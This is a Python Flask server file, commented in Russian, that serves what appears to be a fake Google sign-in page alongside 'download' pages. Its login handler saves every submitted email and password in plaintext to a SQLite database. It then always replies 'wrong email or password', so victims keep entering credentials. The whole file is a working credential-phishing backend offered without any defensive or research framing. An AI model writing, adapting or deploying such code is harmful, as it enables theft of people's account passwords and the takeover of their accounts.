from flask import Flask, render_template, request, jsonify
import sqlite3
import os

app = Flask(__name__)

# Путь к базе данных
DATABASE = 'users.db'

# Функция для создания базы данных и таблицы users
def create_database():
    if not os.path.exists(DATABASE):
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()

# Проверка, существует ли запись с таким email и паролем (регистр учитывается)
def is_duplicate(email, password):
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE email = ? AND password = ?', (email, password))
    result = cursor.fetchone()
    conn.close()
    return result is not None

# Главная страница
@app.route('/')
def index():
    return render_template('index.html')

# Страница загрузки
@app.route('/download')
def download():
    return render_template('download.html')

# Страница входа через Google
@app.route('/google')
def google():
    return render_template('google.html')

# Обработка входа
@app.route('/login', methods=['POST'])
def login():
    try:
        email = request.json.get('email')
        password = request.json.get('password')

        # Проверяем, есть ли дубликат (регистр учитывается)
        if not is_duplicate(email, password):
            # Сохраняем данные в базу данных
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            cursor.execute('INSERT INTO users (email, password) VALUES (?, ?)', (email, password))
            conn.commit()
            conn.close()

        # Всегда возвращаем "Неверная почта или пароль"
        return jsonify({'error': 'Неверная почта или пароль'}), 401
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Обработка ошибки 500
@app.errorhandler(500)
def internal_server_error(e):
    return jsonify({'error': 'Internal Server Error'}), 500

# Запуск сервера
if __name__ == '__main__':
    create_database()  # Создаем базу данных при запуске приложения
    app.run(host='0.0.0.0', port=5000)  # Разрешаем доступ с любого IP